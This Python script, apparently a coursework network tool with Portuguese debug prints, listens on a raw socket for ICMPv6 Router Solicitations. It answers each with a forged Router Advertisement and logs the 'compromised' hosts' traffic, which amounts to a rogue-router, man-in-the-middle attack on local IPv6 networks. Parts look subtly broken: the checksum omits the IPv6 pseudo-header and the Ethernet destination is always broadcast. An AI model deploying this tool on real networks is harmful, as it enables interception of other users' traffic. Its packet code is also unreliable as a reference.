import socket, sys
import struct
import netifaces

ETH_P_ALL = 0x0003
IPV6 = 0x86dd

INTERFACE = 'eth0'

ETH_LENGTH = 14
RTR_SOL = 133       #Router Solicitation code
RTR_ADV = 134       #Router Advertisement code
compromised = []

def getmac():
  try:
    mac = open('/sys/class/net/'+INTERFACE+'/address').readline()
  except:
    mac = "00:00:00:00:00:00"

  return mac[0:17]


def calculate_icmpv6_checksum(packet):
    total = 0
    # Add up 16-bit words
    num_words = len(packet) // 2
    for chunk in struct.unpack("!%sH" % num_words, packet[0:num_words * 2]):
        total += chunk

    # Add any left over byte
    if len(packet) % 2:
        total += packet[-1] << 8

    # Fold 32-bits into 16-bits
    total = (total >> 16) + (total & 0xffff)
    total += total >> 16
    return ~total + 0x10000 & 0xffff 

def bytes_to_mac(bytesmac):
    return ":".join("{:02x}".format(x) for x in bytesmac)

def bytes_to_ipv6(bytesipv6):
    return socket.inet_ntop(socket.AF_INET6, bytesipv6)

def ipv6_to_bytes(ipv6):
    return socket.inet_pton(socket.AF_INET6, ipv6)

def get_my_ipv6():
    addrs = netifaces.ifaddresses('eth0')
    return addrs[netifaces.AF_INET6][1]['addr'].split('%')[0]

def create_eth(mac_dst):
    mac_dst = bytes.fromhex('FFFFFFFFFFFF')
    mac2bytes = lambda m: bytes.fromhex(m.replace(':',''))
    mac_src = mac2bytes(getmac())

    print("MAC DST:",mac_dst)
    print("MAC SRC:",mac_src)
    print("Type:",hex(IPV6))

    return struct.pack("!6s6sH",(mac_dst),mac_src, IPV6)

def is_compromised(sender_ip, dest, next_header):
    if sender_ip in compromised:
        print("IP origem: ", sender_ip)
        print("IP destino: ", dest)
        print("Protocolo: ", next_header)
        return True
    return False

def create_ipv6(sender_ip):
    version = 6
    traffic_class = 0
    flow_label = 0
    payload_legth = 16
    next_header = socket.IPPROTO_ICMPV6
    hop_limit = 255
    
    src_address = ipv6_to_bytes(get_my_ipv6())
    dst_address = ipv6_to_bytes(sender_ip)
    
    ver_traff =  (version << 4) + 0
    traff_lab = 0

    ip_pack = struct.pack('!BBHHBB16s16s', ver_traff, traff_lab, flow_label, payload_legth,next_header, hop_limit, src_address, dst_address)
    return ip_pack

def create_icmpv6(ipv6, sender_ip):
    adv_type = 134
    code = 0
    cur_hop_limit = 0
    router_lifetime = 0x0708
    reachable_time = bytes.fromhex('01010000')
    retrans_timer = bytes.fromhex('00aa0005')
    checksum = 0
    flags = 0x80

    src_address = ipv6_to_bytes(get_my_ipv6())
    dst_address = ipv6_to_bytes(sender_ip)

    upper_length = len(ipv6)
    mbz = 0
    next_header = (mbz << 8) + socket.IPPROTO_ICMPV6

    icmpv6_pack = struct.pack("!BBHBBH4s4s",adv_type,code,checksum,cur_hop_limit,flags,router_lifetime,reachable_time,retrans_timer)
    checksum = calculate_icmpv6_checksum(icmpv6_pack)    
    icmpv6_pack = struct.pack("!BBHBBH4s4s",adv_type,code,checksum,cur_hop_limit,flags,router_lifetime,reachable_time,retrans_timer)
    
    return icmpv6_pack


def send_icmpv6_advertisement(s, packet, mac_src, sender_ip):
    ipv6 = create_ipv6(sender_ip)
    eth = create_eth(mac_src)
    icmpv6 = create_icmpv6(ipv6,sender_ip)
    
    pct = eth + ipv6 + icmpv6
    s.send(pct)
    compromised.append(sender_ip)

def receive_ipv6(s, packet, mac_src): 
    first_word, payload_lenght, next_header, hoplimit = struct.unpack('>IHBB', packet[0:8])
    sender_ip = bytes_to_ipv6(packet[8:24])
    dest = bytes_to_ipv6(packet[24:40])
    payload = packet[40:]

    if is_compromised(sender_ip, dest, next_header):
        return

    if next_header == socket.IPPROTO_ICMPV6:
        icmp_type, icmp_code, icmp_chekcsum = struct.unpack('>BBH', payload[:4])

        if icmp_type == RTR_SOL:
            print("\n\n-------------------------------------------------------------")
            print("Router Solicitation: ")
            print("Sender IP: ", sender_ip)
            print("\n")
            if sender_ip != get_my_ipv6():
                send_icmpv6_advertisement(s, packet, mac_src, sender_ip)

            
if __name__ == '__main__':
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))
    except OSError as msg:
        print('Error'+str(msg))
        sys.exit(1)

    print('Starting...')

    s.bind((INTERFACE,0))

    while True:
        packet, addr = s.recvfrom(65536)

        eth_header = packet[:ETH_LENGTH]
        eth = struct.unpack("!6s6sH",eth_header)

        # checks for ipv6 packets
        if eth[2] == IPV6:
            # print("IPV6 packet received, addr:",addr)
            mac_src = eth[1]
            packet_ipv6 = packet[ETH_LENGTH:]

            receive_ipv6(s, packet_ipv6, mac_src)